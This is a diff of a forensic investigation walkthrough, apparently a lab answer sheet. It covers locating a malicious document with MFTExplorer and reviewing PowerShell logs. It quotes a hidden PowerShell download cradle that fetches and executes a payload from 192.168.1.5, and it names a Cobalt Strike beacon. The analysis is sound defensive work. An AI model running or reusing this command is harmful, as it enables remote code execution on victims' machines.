@@ -511,10 +511,19 @@ Malicious Powershell Script Execution:
 
 ![image](https://github.com/user-attachments/assets/07ba599e-943b-4ebf-b682-ac31cf0f0623)
 
+71. Goes the same for this one, many ways to identify the filepath. The evidence I provided below is the example to identify the filepath of the malicious document by loading the raw **$MFT** file to `MFTExplorer.exe`.
+
+![image](https://github.com/user-attachments/assets/79299b0d-e66b-4824-8c37-2f9f8ada9133)
+ 
+
 
 > 20TH QUESTION --> ANS: `powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://192.168.1.5:806/a'))`
 
 ![image](https://github.com/user-attachments/assets/76c9edc4-6c82-41fe-9af1-1ad69081318a)
+
+
+72. Now refer back way to our first finding when searching the red flag indicator for `policy.docm` file. At **Windows Powershell** event log we previously identified a suspicious powershell execution.
+73. 
 
 
 > 21ST QUESTION --> ANS: `trojan.cobaltstrike/beacon`
